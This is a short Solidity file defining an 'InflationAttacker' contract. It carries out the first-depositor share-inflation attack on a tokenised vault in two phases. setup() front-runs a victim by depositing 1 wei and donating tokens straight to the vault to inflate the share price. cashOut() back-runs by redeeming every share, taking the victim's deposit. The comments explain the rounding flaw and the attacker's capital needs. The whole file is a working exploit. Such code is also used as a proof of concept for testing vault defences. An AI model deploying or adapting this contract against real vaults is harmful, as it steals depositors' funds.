// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function redeem(uint256 shares) external returns (uint256 assets);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @notice First-depositor inflation (donation) attack, in two phases around the victim's deposit:
///
///   setup()   - FRONT-RUN: deposit a tiny amount (1 wei) to become the only shareholder,
///               then transfer tokens straight to the vault ("donate") to inflate the price per share.
///   (victim deposits here and, because of rounding, receives 0 shares or far too few)
///   cashOut() - BACK-RUN: redeem the attacker's shares for everything in the vault.
///
/// The attacker does not lose the donation: they own (almost) all the shares, so they get it back
/// when they redeem. Their real requirement is having enough capital on hand at the time of the attack.
contract InflationAttacker {
    IVault public immutable vault;
    IERC20Min public immutable token;

    constructor(address _vault, address _token) {
        vault = IVault(_vault);
        token = IERC20Min(_token);
        IERC20Min(_token).approve(_vault, type(uint256).max);
    }

    /// @notice Phase 1 (front-run). Becomes the first shareholder, then donates to inflate the share price.
    function setup(uint256 initialDeposit, uint256 donation) external {
        vault.deposit(initialDeposit);
        token.transfer(address(vault), donation); // direct transfer: no shares are minted for it
    }

    /// @notice Phase 3 (back-run). Redeems every share the attacker holds.
    function cashOut() external returns (uint256 received) {
        received = vault.redeem(vault.balanceOf(address(this)));
    }
}
